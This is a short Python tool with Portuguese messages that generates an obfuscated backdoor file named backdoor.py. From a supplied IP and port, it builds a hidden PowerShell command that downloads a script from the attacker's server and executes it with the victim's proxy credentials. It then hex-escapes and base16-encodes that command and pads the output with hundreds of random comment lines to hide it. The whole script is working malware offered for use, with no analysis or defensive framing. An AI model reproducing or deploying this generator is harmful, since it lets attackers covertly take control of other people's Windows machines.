# Autor: d3z3n0v3
# CÓPIA NÃO COMÉDIA

from base64 import b16encode, b16decode
from sys import argv
from re import match
from os import system
import random


class Encoder(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.encode()

    def __str__(self):
        return self.cmd

    def encode(self):
        shell_code = "\\x" + "\\x".join("{0:x}".format(ord(_)) for _ in self.cmd)
        self.cmd = "_ = ('" + shell_code + "'); exec(_)"


class IPAddress(object):
    def __init__(self, ip):
        self.ip = ip

    def __bool__(self):
        return bool(match(r"^((\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d{2}|2[0-4]\d|25[0-5])$", self.ip))
		

class Port(object):
	def __init__(self, port):
		self.port = port
	
	def __bool__(self):
		return bool(match(r"^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$", self.port))
		
if __name__ == "__main__":
	if len(argv) >= 3:
		if IPAddress(argv[1]) and Port(argv[2]):
			template = """from os import system; system('''powershell.exe -nop -w hidden -c $R=new-object net.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();$R.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $R.downloadstring('http://{ip}:{port}/index.php');''')"""
			template = template.format(ip=argv[1], port=argv[2])
			raw = template
			generated = str(Encoder(raw))
			encoded = b16encode(bytes(generated, "utf-8"))
			final = ""
			for i in range(random.randint(100, 1000 + 1)):
				final += "#%032x\n" % random.getrandbits(256 if i % 2 == 0 else 128)
			final += "exec('''from base64 import b16decode; eval(compile(b16decode('" + encoded.decode() + "'), " + "'<string>'" + ", 'exec'))''')"
			print(final, file=open("backdoor.py", "w"))
			print("[!] Backdoor gerado com sucesso!\n[!] Arquivo: backdoor.py")
